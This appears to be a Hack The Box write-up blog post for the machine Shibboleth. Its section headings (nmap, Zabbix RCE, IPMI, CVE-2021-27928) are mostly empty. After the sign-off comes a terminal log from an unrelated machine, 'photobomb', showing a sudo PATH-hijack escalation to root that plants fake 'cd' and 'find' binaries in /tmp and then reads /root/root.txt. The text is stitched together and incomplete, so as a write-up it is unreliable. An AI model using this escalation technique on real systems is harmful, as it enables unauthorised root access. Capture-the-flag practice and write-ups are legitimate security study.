---
layout: post
title: "HTB: SHIBBOLETH (10.10.11.124)"
description: ""
tags: []
image: "/assets/img/shibboleth/shibboleth_feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

We run NMAP with default scripts and enumerate version and save it in the directory called nmap.

```nmap

```
From the result we only see one port open. Also, we note nmap was not redirected. Lets add shibboleth.htb to our hosts file and run the scan again.

```nmap

```


### Website - TCP 80
#### Site


#### Tech Stack


### Directory Brute Force


#### Site

### Zabbix


#### UDP Port 623

## Shell as Zabbix
#### Exploiting Zabbix

#### Testing RCE


#### RCE confirmed


## Shell as ipmi-svc

### Password reuse


## Shell as root
### Enumeration
#### MySQL

### CVE-2021-27928
#### Indentify


#### Execute:

********* And that was fun!!. Thank you for taking time to read my blog ************

wizard@photobomb:~$ echo "/bin/bash" > /tmp/cd
echo "/bin/bash" > /tmp/cd
wizard@photobomb:~$ echo "/bin/bash" > /tmp/find
echo "/bin/bash" > /tmp/find
wizard@photobomb:~$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# id
id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
cat /root/root.txt
